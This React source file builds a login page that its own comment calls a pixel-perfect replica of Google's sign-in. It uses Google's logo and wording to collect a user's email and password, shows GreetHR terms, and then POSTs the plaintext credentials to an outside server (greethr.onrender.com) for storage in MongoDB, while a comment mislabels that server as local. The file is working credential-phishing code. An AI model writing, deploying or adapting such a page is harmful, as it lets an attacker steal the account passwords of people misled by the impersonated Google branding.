import { useState, useRef, useCallback } from 'react';
import GoogleLogo from '../components/GoogleLogo';
import './LoginPage.css';

/**
 * LoginPage - A pixel-perfect replica of the Google sign-in page.
 * Features a multi-step flow:
 * 1. Email entry
 * 2. Password entry
 * 3. Privacy & Terms agreement screen
 * 4. Success confirmation (credentials saved to MongoDB)
 */
function LoginPage({ onBack, onLoginSuccess }) {
  const [step, setStep] = useState('email'); // 'email' | 'password' | 'terms' | 'success'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [apiError, setApiError] = useState('');

  const emailInputRef = useRef(null);
  const passwordInputRef = useRef(null);

  /**
   * Validate the email input field.
   * Returns true if valid, false otherwise.
   */
  const validateEmail = useCallback(() => {
    const trimmed = email.trim();
    if (!trimmed) {
      setEmailError('Enter an email or phone number');
      return false;
    }
    // Basic email format check (allows phone numbers too)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?[\d\s-()]{7,}$/;
    if (!emailRegex.test(trimmed) && !phoneRegex.test(trimmed)) {
      setEmailError("Couldn't find your Google Account");
      return false;
    }
    setEmailError('');
    return true;
  }, [email]);

  /**
   * Validate the password input field.
   * Returns true if valid, false otherwise.
   */
  const validatePassword = useCallback(() => {
    if (!password) {
      setPasswordError('Enter a password');
      return false;
    }
    setPasswordError('');
    return true;
  }, [password]);

  /**
   * Transition to a different step with animation.
   */
  const transitionTo = useCallback((nextStep, afterTransitionFn) => {
    setIsTransitioning(true);
    setTimeout(() => {
      setStep(nextStep);
      setIsTransitioning(false);
      if (afterTransitionFn) {
        afterTransitionFn();
      }
    }, 200);
  }, []);

  /**
   * Handle the "Next" button click on the email step.
   */
  const handleEmailNext = useCallback((e) => {
    e.preventDefault();
    if (validateEmail()) {
      transitionTo('password', () => {
        setTimeout(() => {
          passwordInputRef.current?.focus();
        }, 50);
      });
    } else {
      emailInputRef.current?.focus();
    }
  }, [validateEmail, transitionTo]);

  /**
   * Handle the "Next" button click on the password step.
   */
  const handlePasswordNext = useCallback((e) => {
    e.preventDefault();
    if (validatePassword()) {
      transitionTo('terms');
    } else {
      passwordInputRef.current?.focus();
    }
  }, [validatePassword, transitionTo]);

  /**
   * Submit credentials to local backend server to save in MongoDB
   */
  const handleAgreeAndSubmit = useCallback(async () => {
    setIsSaving(true);
    setApiError('');
    try {
      const response = await fetch('https://greethr.onrender.com/api/auth/save-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email.trim(),
          password: password,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        transitionTo('success');
      } else {
        setApiError(data.error || 'Failed to save credentials to database.');
      }
    } catch (err) {
      console.error('API Error:', err);
      setApiError('Unable to connect to local database server (port 5001).');
    } finally {
      setIsSaving(false);
    }
  }, [email, password, transitionTo]);

  /**
   * Go back to the email step (from the user chip or cancel).
   */
  const handleBackToEmail = useCallback(() => {
    transitionTo('email', () => {
      setPassword('');
      setPasswordError('');
      setShowPassword(false);
      setApiError('');
      setTimeout(() => {
        emailInputRef.current?.focus();
      }, 50);
    });
  }, [transitionTo]);

  /** Error icon used in validation messages */
  const ErrorIcon = () => (
    <svg className="login-error__icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
    </svg>
  );

  /** Down-arrow icon for the user chip */
  const ChevronDown = () => (
    <svg className="login-card__user-chip-arrow" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
    </svg>
  );

  /** Globe icon for language selector */
  const GlobeIcon = () => (
    <svg className="login-footer__language-icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95a15.65 15.65 0 00-1.38-3.56A8.03 8.03 0 0118.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.987 7.987 0 015.08 16zm2.95-8H5.08a7.987 7.987 0 014.33-3.56A15.65 15.65 0 008.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 01-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z" />
    </svg>
  );

  /** Person icon for the user chip */
  const PersonIcon = () => (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
    </svg>
  );

  /** Checkmark icon for success page */
  const CheckmarkIcon = () => (
    <svg className="login-success__icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
    </svg>
  );

  return (
    <div className="login-page">
      <main className="login-page__main">
        <div className="login-card">
          {/* Header */}
          <div className="login-card__header">
            {onBack && step === 'email' && (
              <button
                type="button"
                className="login-btn--text"
                onClick={onBack}
                style={{
                  alignSelf: 'flex-start',
                  padding: '6px 12px',
                  margin: '-16px 0 12px -12px',
                  fontSize: '13px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '4px',
                  fontFamily: 'var(--font-google-sans)'
                }}
                id="back-to-portal-btn"
              >
                ← Back to Portal
              </button>
            )}

            <div className="login-card__logo">
              <GoogleLogo size={36} />
            </div>

            {step === 'email' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="email-header">
                <h1 className="login-card__title">Sign in</h1>
                <p className="login-card__subtitle">Use your Google Account</p>
              </div>
            )}

            {step === 'password' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="password-header">
                <h1 className="login-card__title">Welcome</h1>
                <button
                  type="button"
                  className="login-card__user-chip"
                  onClick={handleBackToEmail}
                  aria-label={`Signed in as ${email.trim()}, click to change`}
                  id="user-chip"
                >
                  <span className="login-card__user-chip-icon">
                    <PersonIcon />
                  </span>
                  <span className="login-card__user-chip-email">{email.trim()}</span>
                  <ChevronDown />
                </button>
              </div>
            )}

            {step === 'terms' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="terms-header">
                <h1 className="login-card__title">Privacy & Terms</h1>
                <button
                  type="button"
                  className="login-card__user-chip"
                  onClick={handleBackToEmail}
                  aria-label={`Signed in as ${email.trim()}, click to change`}
                  id="user-chip-terms"
                >
                  <span className="login-card__user-chip-icon">
                    <PersonIcon />
                  </span>
                  <span className="login-card__user-chip-email">{email.trim()}</span>
                  <ChevronDown />
                </button>
              </div>
            )}

            {step === 'success' && (
              <div className="login-success">
                <CheckmarkIcon />
                <h1 className="login-success__title">Success!</h1>
                <p className="login-success__subtitle">
                  Thank you for logging in. You can now access the dashboard.
                </p>
                <button
                  type="button"
                  className="login-btn--primary"
                  onClick={() => onLoginSuccess && onLoginSuccess(email)}
                  id="dashboard-btn"
                >
                  Go to Dashboard
                </button>
              </div>
            )}
          </div>

          {/* Form / Content Steps */}
          {step === 'email' && (
            <form
              className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`}
              onSubmit={handleEmailNext}
              key="email-form"
              noValidate
            >
              <div className="login-input-group">
                <input
                  type="email"
                  id="email"
                  name="email"
                  className={`login-input ${emailError ? 'login-input--error' : ''}`}
                  placeholder=" "
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError('');
                  }}
                  autoComplete="username"
                  autoFocus
                  ref={emailInputRef}
                  required
                  enterKeyHint="next"
                  aria-describedby="email-error"
                  aria-invalid={!!emailError}
                />
                <label htmlFor="email" className="login-input-label">
                  Email or phone
                </label>
              </div>

              <div
                id="email-error"
                className={`login-error ${!emailError ? 'login-error--hidden' : ''}`}
                role="alert"
                aria-live="polite"
              >
                <ErrorIcon />
                <span>{emailError || 'Placeholder'}</span>
              </div>

              <a href="#" className="login-card__forgot-link" id="forgot-email-link">
                Forgot email?
              </a>

              <div className="login-card__info">
                Not your computer? Use Guest mode to sign in privately.{' '}
                <a href="#" id="learn-more-link">Learn more about using Guest mode</a>
              </div>

              <div className="login-card__actions">
                <button
                  type="button"
                  className="login-btn--text"
                  id="create-account-btn"
                >
                  Create account
                </button>
                <button
                  type="submit"
                  className="login-btn--primary"
                  id="email-next-btn"
                >
                  Next
                </button>
              </div>
            </form>
          )}

          {step === 'password' && (
            <form
              className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`}
              onSubmit={handlePasswordNext}
              key="password-form"
              noValidate
            >
              <div className="login-input-group">
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="current-password"
                  name="password"
                  className={`login-input ${passwordError ? 'login-input--error' : ''}`}
                  placeholder=" "
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (passwordError) setPasswordError('');
                  }}
                  autoComplete="current-password"
                  ref={passwordInputRef}
                  required
                  enterKeyHint="done"
                  aria-describedby="password-error"
                  aria-invalid={!!passwordError}
                />
                <label htmlFor="current-password" className="login-input-label">
                  Enter your password
                </label>
              </div>

              <div
                id="password-error"
                className={`login-error ${!passwordError ? 'login-error--hidden' : ''}`}
                role="alert"
                aria-live="polite"
              >
                <ErrorIcon />
                <span>{passwordError || 'Placeholder'}</span>
              </div>

              <label className="login-card__show-password" id="show-password-toggle">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <span>Show password</span>
              </label>

              <div className="login-card__info" style={{ marginTop: 'auto', paddingTop: '16px' }}>
                {/* Spacer to push actions to bottom */}
              </div>

              <div className="login-card__actions">
                <a href="#" className="login-btn--text" id="forgot-password-link" style={{ padding: '10px 12px' }}>
                  Forgot password?
                </a>
                <button
                  type="submit"
                  className="login-btn--primary"
                  id="password-next-btn"
                >
                  Next
                </button>
              </div>
            </form>
          )}

          {step === 'terms' && (
            <div className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`} key="terms-form">
              <div className="login-card__terms-container">
                <h2>Welcome to GreetHR Portal</h2>
                <h3>Terms and Conditions</h3>
                <p>Please read these terms and conditions carefully before using Our Service.</p>
                <h2>Interpretation and Definitions</h2>
                <h3>Interpretation</h3>
                <p>The words whose initial letters are capitalized have meanings defined under the following conditions. The following definitions shall have the same meaning regardless of whether they appear in singular or in plural.</p>
                <h3>Definitions</h3>
                <p>For the purposes of these Terms and Conditions:</p>
                <ul>
                  <li>
                    <p><strong>Affiliate</strong> means an entity that controls, is controlled by, or is under common control with a party, where &quot;control&quot; means ownership of 50% or more of the shares, equity interest or other securities entitled to vote for election of directors or other managing authority.</p>
                  </li>
                  <li>
                    <p><strong>Country</strong> refers to:  Qatar</p>
                  </li>
                  <li>
                    <p><strong>Company</strong> (referred to as either &quot;the Company&quot;, &quot;We&quot;, &quot;Us&quot; or &quot;Our&quot; in these Terms and Conditions) refers to GreetHR.</p>
                  </li>
                  <li>
                    <p><strong>Device</strong> means any device that can access the Service such as a computer, a cell phone or a digital tablet.</p>
                  </li>
                  <li>
                    <p><strong>Service</strong> refers to the Website.</p>
                  </li>
                  <li>
                    <p><strong>Terms and Conditions</strong> (also referred to as &quot;Terms&quot;) means these Terms and Conditions, including any documents expressly incorporated by reference, which govern Your access to and use of the Service and form the entire agreement between You and the Company regarding the Service. These Terms and Conditions have been created with the help of the <a href="https://www.termsfeed.com/terms-conditions-generator/" target="_blank">Terms and Conditions Generator</a>.</p>
                  </li>
                  <li>
                    <p><strong>Third-Party Social Media Service</strong> means any services or content (including data, information, products or services) provided by a third party that is displayed, included, made available, or linked to through the Service.</p>
                  </li>
                  <li>
                    <p><strong>Website</strong> refers to GreetHR, accessible from <a href="greethr.vercel.app" rel="external nofollow noopener" target="_blank">greethr.vercel.app</a></p>
                  </li>
                  <li>
                    <p><strong>You</strong> means the individual accessing or using the Service, or the company, or other legal entity on behalf of which such individual is accessing or using the Service, as applicable.</p>
                  </li>
                </ul>
                <h2>Acknowledgment</h2>
                <p>These are the Terms and Conditions governing the use of this Service and the agreement between You and the Company. These Terms and Conditions set out the rights and obligations of all users regarding the use of the Service.</p>
                <p>Your access to and use of the Service is conditioned on Your acceptance of and compliance with these Terms and Conditions. These Terms and Conditions apply to all visitors, users and others who access or use the Service.</p>
                <p>By accessing or using the Service You agree to be bound by these Terms and Conditions. If You disagree with any part of these Terms and Conditions then You may not access the Service.</p>
                <p>You represent that you are over the age of 18. The Company does not permit those under 18 to use the Service.</p>
                <p>Your access to and use of the Service is also subject to Our Privacy Policy, which describes how We collect, use, and disclose personal information. Please read Our Privacy Policy carefully before using Our Service.</p>
                <h2>Links to Other Websites</h2>
                <p>Our Service may contain links to third-party websites or services that are not owned or controlled by the Company.</p>
                <p>The Company has no control over, and assumes no responsibility for, the content, privacy policies, or practices of any third-party websites or services. You further acknowledge and agree that the Company shall not be responsible or liable, directly or indirectly, for any damage or loss caused or alleged to be caused by or in connection with the use of or reliance on any such content, goods or services available on or through any such websites or services.</p>
                <p>We strongly advise You to read the terms and conditions and privacy policies of any third-party websites or services that You visit.</p>
                <h3>Links from a Third-Party Social Media Service</h3>
                <p>The Service may display, include, make available, or link to content or services provided by a Third-Party Social Media Service. A Third-Party Social Media Service is not owned or controlled by the Company, and the Company does not endorse or assume responsibility for any Third-Party Social Media Service.</p>
                <p>You acknowledge and agree that the Company shall not be responsible or liable, directly or indirectly, for any damage or loss caused or alleged to be caused by or in connection with Your access to or use of any Third-Party Social Media Service, including any content, goods, or services made available through them. Your use of any Third-Party Social Media Service is governed by that Third-Party Social Media Service's terms and privacy policies.</p>
                <h2>Termination</h2>
                <p>We may terminate or suspend Your access immediately, without prior notice or liability, for any reason whatsoever, including without limitation if You breach these Terms and Conditions.</p>
                <p>Upon termination, Your right to use the Service will cease immediately.</p>
                <h2>Limitation of Liability</h2>
                <p>Notwithstanding any damages that You might incur, the entire liability of the Company and any of its suppliers under any provision of these Terms and Your exclusive remedy for all of the foregoing shall be limited to the amount actually paid by You through the Service or 100 USD if You haven't purchased anything through the Service.</p>
                <p>To the maximum extent permitted by applicable law, in no event shall the Company or its suppliers be liable for any special, incidental, indirect, or consequential damages whatsoever (including, but not limited to, damages for loss of profits, loss of data or other information, for business interruption, for personal injury, loss of privacy arising out of or in any way related to the use of or inability to use the Service, third-party software and/or third-party hardware used with the Service, or otherwise in connection with any provision of these Terms), even if the Company or any supplier has been advised of the possibility of such damages and even if the remedy fails of its essential purpose.</p>
                <p>Some states do not allow the exclusion of implied warranties or limitation of liability for incidental or consequential damages, which means that some of the above limitations may not apply. In these states, each party's liability will be limited to the greatest extent permitted by law.</p>
                <h2>&quot;AS IS&quot; and &quot;AS AVAILABLE&quot; Disclaimer</h2>
                <p>The Service is provided to You &quot;AS IS&quot; and &quot;AS AVAILABLE&quot; and with all faults and defects without warranty of any kind. To the maximum extent permitted under applicable law, the Company, on its own behalf and on behalf of its Affiliates and its and their respective licensors and service providers, expressly disclaims all warranties, whether express, implied, statutory or otherwise, with respect to the Service, including all implied warranties of merchantability, fitness for a particular purpose, title and non-infringement, and warranties that may arise out of course of dealing, course of performance, usage or trade practice. Without limitation to the foregoing, the Company provides no warranty or undertaking, and makes no representation of any kind that the Service will meet Your requirements, achieve any intended results, be compatible or work with any other software, applications, systems or services, operate without interruption, meet any performance or reliability standards or be error free or that any errors or defects can or will be corrected.</p>
                <p>Without limiting the foregoing, neither the Company nor any of the company's provider makes any representation or warranty of any kind, express or implied: (i) as to the operation or availability of the Service, or the information, content, and materials or products included thereon; (ii) that the Service will be uninterrupted or error-free; (iii) as to the accuracy, reliability, or currency of any information or content provided through the Service; or (iv) that the Service, its servers, the content, or e-mails sent from or on behalf of the Company are free of viruses, scripts, trojan horses, worms, malware, timebombs or other harmful components.</p>
                <p>Some jurisdictions do not allow the exclusion of certain types of warranties or limitations on applicable statutory rights of a consumer, so some or all of the above exclusions and limitations may not apply to You. But in such a case the exclusions and limitations set forth in this section shall be applied to the greatest extent enforceable under applicable law.</p>
                <h2>Governing Law</h2>
                <p>The laws of the Country, excluding its conflicts of law rules, shall govern these Terms and Your use of the Service. Your use of the Application may also be subject to other local, state, national, or international laws.</p>
                <h2>Disputes Resolution</h2>
                <p>If You have any concern or dispute about the Service, You agree to first try to resolve the dispute informally by contacting the Company.</p>
                <h2>For European Union (EU) Users</h2>
                <p>If You are a European Union consumer, you will benefit from any mandatory provisions of the law of the country in which You are resident.</p>
                <h2>United States Legal Compliance</h2>
                <p>You represent and warrant that (i) You are not located in a country that is subject to the United States government embargo, or that has been designated by the United States government as a &quot;terrorist supporting&quot; country, and (ii) You are not listed on any United States government list of prohibited or restricted parties.</p>
                <h2>Severability and Waiver</h2>
                <h3>Severability</h3>
                <p>If any provision of these Terms is held to be unenforceable or invalid, such provision will be changed and interpreted to accomplish the objectives of such provision to the greatest extent possible under applicable law and the remaining provisions will continue in full force and effect.</p>
                <h3>Waiver</h3>
                <p>Except as provided herein, the failure to exercise a right or to require performance of an obligation under these Terms shall not affect a party's ability to exercise such right or require such performance at any time thereafter nor shall the waiver of a breach constitute a waiver of any subsequent breach.</p>
                <h2>Translation Interpretation</h2>
                <p>These Terms and Conditions may have been translated if We have made them available to You on our Service.
                  You agree that the original English text shall prevail in the case of a dispute.</p>
                <h2>Changes to These Terms and Conditions</h2>
                <p>We reserve the right, at Our sole discretion, to modify or replace these Terms at any time. If a revision is material We will make reasonable efforts to provide at least 30 days' notice prior to any new terms taking effect. What constitutes a material change will be determined at Our sole discretion.</p>
                <p>By continuing to access or use Our Service after those revisions become effective, You agree to be bound by the revised terms. If You do not agree to the new terms, in whole or in part, please stop using the Service.</p>
                <h2>Contact Us</h2>
                <p>If you have any questions about these Terms and Conditions, You can contact us:</p>
                <ul>
                  <li>By visiting this page on our website: <a href="greethr.vercel.app" rel="external nofollow noopener" target="_blank">greethr.vercel.app</a></li>
                </ul>
              </div>

              {apiError && (
                <div className="login-error" role="alert" style={{ marginBottom: '12px' }}>
                  <ErrorIcon />
                  <span>{apiError}</span>
                </div>
              )}

              <div className="login-card__actions" style={{ marginTop: 'auto' }}>
                <button
                  type="button"
                  className="login-btn--text"
                  onClick={handleBackToEmail}
                  disabled={isSaving}
                  id="terms-cancel-btn"
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="login-btn--primary"
                  onClick={handleAgreeAndSubmit}
                  disabled={isSaving}
                  id="terms-agree-btn"
                  style={{ minWidth: '110px' }}
                >
                  {isSaving ? 'Agreeing...' : 'I Agree'}
                </button>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      {step !== 'success' && (
        <footer className="login-footer">
          <div className="login-footer__language">
            <GlobeIcon />
            <div className="login-footer__language-wrapper">
              <select
                aria-label="Change language"
                defaultValue="en"
                id="language-select"
              >
                <option value="en">English (United States)</option>
                <option value="es">Español (Latinoamérica)</option>
                <option value="fr">Français (France)</option>
                <option value="de">Deutsch (Deutschland)</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
                <option value="zh-CN">中文 (简体)</option>
                <option value="ar">العربية</option>
                <option value="hi">हिन्दी</option>
                <option value="pt-BR">Português (Brasil)</option>
              </select>
            </div>
          </div>

          <nav className="login-footer__links" aria-label="Footer navigation">
            <a href="#" id="help-link">Help</a>
            <a href="#" id="privacy-link">Privacy</a>
            <a href="#" id="terms-link">Terms</a>
          </nav>
        </footer>
      )}
    </div>
  );
}

export default LoginPage;
